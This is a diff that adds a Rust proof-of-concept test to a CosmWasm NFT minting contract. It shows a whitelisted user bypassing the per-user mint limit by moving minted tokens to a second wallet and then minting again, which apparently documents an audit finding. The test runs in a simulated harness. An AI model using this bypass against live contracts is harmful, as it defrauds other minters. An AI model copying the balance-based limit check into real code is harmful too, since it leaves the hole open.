@@ -140,4 +140,81 @@ pub mod tests {
 
         assert_eq!(config.total_tokens, 4);
     }
+
+    const USER1_ALT_WALLET: &str = "user1_alt_wallet";
+
+    // We will show how USER1 can bypass the mint limit
+    #[test]
+    fn exploit_mint_query_flaw() {
+        // base setup with mint limit 3 and USER1 whitelisted
+        let (mut app, contract_addr) = proper_instantiate();
+        // mint 3 NFTs to USER1
+        for _ in 0..3 {
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::Mint {},
+                &[],
+            )
+            .unwrap();
+        }
+
+        let Config {
+            nft_contract,
+            mint_per_user,
+            total_tokens,
+        } = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(mint_per_user, 3);
+        assert_eq!(total_tokens, 3);
+
+        // Query USER1's balance 
+        let tokens: cw721::TokensResponse = app
+            .wrap()
+            .query_wasm_smart(
+                nft_contract.clone(),
+                &cw721::Cw721QueryMsg::Tokens {
+                    owner: USER1.to_string(),
+                    start_after: None,
+                    limit: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(tokens.tokens.len(), 3);
+
+        // User can transfer the 3 NFTs minted to another wallet
+        for token in tokens.tokens {
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                nft_contract.clone(),
+                &cw721::Cw721ExecuteMsg::TransferNft {
+                    recipient: USER1_ALT_WALLET.to_string(),
+                    token_id: token,
+                },
+                &[],
+            )
+            .unwrap();
+        }
+        // USER1 now can mint even more  
+        for _ in 0..3 {
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::Mint {},
+                &[],
+            )
+            .unwrap();
+        }
+        let Config {
+            total_tokens,
+            ..
+        } = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        // USER1 has now minted 6 NFTs in total
+        assert_eq!(total_tokens, 6); 
+    }
 }
